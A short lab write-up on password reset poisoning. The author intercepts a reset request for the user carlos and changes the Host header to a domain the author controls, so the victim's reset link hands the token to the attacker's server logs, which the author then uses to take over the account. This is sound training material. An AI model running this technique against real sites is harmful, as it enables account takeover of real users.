Title: Basic password reset poisoning
Desc:  This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account.
You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server. 

after logging in:
`Your email is: wiener@exploit-0a6e0088038a20a3800f025801140040.exploit-server.net`

![image](https://github.com/user-attachments/assets/77f4acdf-a6da-4d38-80b5-918aef78f456)

send reset password request for carlos:
![image](https://github.com/user-attachments/assets/307203b1-12e1-49ec-b6c0-25a67169e17d)

intercept that
![image](https://github.com/user-attachments/assets/ab539afb-cdc8-488a-8eb7-ba8d41ad8e75)

my domain is : exploit-0a6e0088038a20a3800f025801140040.exploit-server.net

I changed Host header to contain my domain (which I controll):
![image](https://github.com/user-attachments/assets/5663576f-c0d4-4f7c-948c-7b241e69444c)

I know, that the user carlos will click link, so he would receive link like that:
`https://exploit-0a6e0088038a20a3800f025801140040.exploit-server.net/forgot-password?temp-forgot-password-token=iek3ima5s7r8xb8dcm4dh3k2tcwoc12w`

Please note, that in this link there is reset password token. After clicking the link user carlos send GET request to my server and I can see in my logs his request and I can get his token.
`/forgot-password?temp-forgot-password-token=iek3ima5s7r8xb8dcm4dh3k2tcwoc12w`

Now I can use this token to change password of user carlos.










